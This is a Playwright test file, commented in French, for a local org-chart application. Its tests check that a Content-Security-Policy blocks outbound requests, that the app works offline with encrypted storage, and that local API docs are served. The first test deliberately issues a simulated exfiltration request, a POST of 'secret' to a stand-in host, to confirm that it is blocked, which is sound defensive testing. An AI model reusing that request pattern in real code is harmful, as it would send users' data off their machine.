// Contrainte non négociable : aucune donnée ne quitte la machine.
// (En plus de ce fichier, CHAQUE scénario échoue s'il observe une requête externe — voir fixtures.js.)
import { test, expect } from './fixtures.js'

test('le navigateur refuse toute connexion vers l’extérieur', async ({ app, page, network }) => {
  await app.open()
  network.expectBlocked(/exemple\.invalid/) // cette tentative est volontaire
  // même du code malveillant injecté ne pourrait pas envoyer de données : la CSP bloque la requête
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://exemple.invalid/fuite', { method: 'POST', body: 'secret' })
      return false
    } catch {
      return true
    }
  })
  expect(blocked).toBe(true)
})

test('politique de sécurité en place', async ({ app, page }) => {
  if (app.isServer) {
    const res = await page.request.get(app.baseURL)
    expect(res.headers()['content-security-policy']).toContain("default-src 'self'")
  } else {
    await page.goto(app.baseURL)
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
    expect(csp).toContain("connect-src 'none'")
  }
})

test('fonctionne hors ligne une fois chargée', async ({ app, page, context }) => {
  test.skip(app.isServer, 'en mode serveur, le serveur local doit rester joignable')
  await app.open()
  await context.setOffline(true)
  await app.importFile('collaborateurs_avec_superieur.xlsx')
  await expect(page.getByTestId('person-card')).toHaveCount(48)
  await page.reload()
  await app.passVault() // au rechargement, le mot de passe est redemandé
  await expect(page.getByTestId('person-card')).toHaveCount(48) // données conservées (IndexedDB, chiffrées)
})

test('documentation Swagger de l’API, servie localement', async ({ app, page }) => {
  test.skip(!app.isServer, 'pas d’API en mode autonome')
  await page.goto(new URL('api/docs', app.baseURL + '/').href)
  await expect(page).toHaveURL(/\/api-docs\/$/)
  await expect(page.getByRole('heading', { name: /Organigramme — API locale/ })).toBeVisible()
  await expect(page.locator('.opblock-tag', { hasText: 'Collaborateurs' })).toBeVisible()
  await expect(page.getByText('/api/employees/{emp_id}')).toBeVisible()
})
